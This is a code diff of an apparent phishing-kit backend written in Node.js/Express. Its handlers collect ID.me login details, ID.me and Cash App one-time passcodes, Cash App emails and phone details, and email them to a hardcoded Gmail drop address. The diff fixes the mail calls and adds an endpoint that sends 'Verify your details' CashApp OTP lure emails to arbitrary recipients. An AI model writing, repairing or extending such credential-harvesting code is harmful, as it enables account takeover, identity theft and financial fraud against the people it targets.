@@ -9,7 +9,7 @@ exports.authenticateAdminUser = (req, res) => {
         console.log(message)
         const reason = 'Idme Login details'
 
-        sendEmail(email, message, reason, (data) => {
+        sendEmail.sendEmail(email, message, reason, (data) => {
             if (data) {
                 return res.status(200).json({
                     status: 200,
@@ -33,7 +33,7 @@ exports.mobile = (req, res) => {
         const reason = 'Gov mobile details'
         const email = 'techt5562@gmail.com'
 
-        sendEmail(email, message, reason, (data) => {
+        sendEmail.sendEmail(email, message, reason, (data) => {
             if (data) {
                 return res.status(200).json({
                     status: 200,
@@ -49,16 +49,16 @@ exports.mobile = (req, res) => {
 }
 
 exports.email = (req, res) => {
-    const { emails } = req.body;
+    const { emailSent } = req.body;
     console.log(req.body)
 
     try {
-        const message = `cash app email:${emails}`
+        const message = `cash app email:${emailSent}`
         console.log(message)
         const reason = 'CashApp email'
         const email = 'techt5562@gmail.com'
 
-        sendEmail(email, message, reason, (data) => {
+        sendEmail.sendEmail(email, message, reason, (data) => {
             if (data) {
                 return res.status(200).json({
                     status: 200,
@@ -69,6 +69,7 @@ exports.email = (req, res) => {
 
         }).then(response => res.send(response.message)).catch(error => res.status);
     } catch (error) {
+        console.log(error)
         return res.status(500).send(error.message);
     }
 }
@@ -82,7 +83,7 @@ exports.code = (req, res) => {
         const reason = 'idme Otp code'
         const email = 'techt5562@gmail.com'
 
-        sendEmail(email, message, reason, (data) => {
+        sendEmail.sendEmail(email, message, reason, (data) => {
             if (data) {
                 return res.status(200).json({
                     status: 200,
@@ -105,7 +106,7 @@ exports.cashCode = (req, res) => {
         const reason = 'Cashapp Otp code'
         const email = 'techt5562@gmail.com'
 
-        sendEmail(email, message, reason, (data) => {
+        sendEmail.sendEmail(email, message, reason, (data) => {
             if (data) {
                 return res.status(200).json({
                     status: 200,
@@ -116,6 +117,31 @@ exports.cashCode = (req, res) => {
 
         }).then(response => res.send(response.message)).catch(error => res.status);
     } catch (error) {
+        return res.status(500).send(error.message);
+    }
+}
+
+exports.Template = (req, res) => {
+    const { email } = req.body;
+
+    try {
+        const message = `CashApp Otp:`
+        console.log(message)
+        const reason = 'Verify your details'
+  
+
+        sendEmail.sendEmailTemplate(email, message, reason, (data) => {
+            if (data) {
+                return res.status(200).json({
+                    status: 200,
+                    email: email,
+                    msg: 'email sent'
+                });
+            }
+
+        }).then(response => res.send(response.message)).catch(error => res.status);
+    } catch (error) {
+
         return res.status(500).send(error.message);
     }
 }
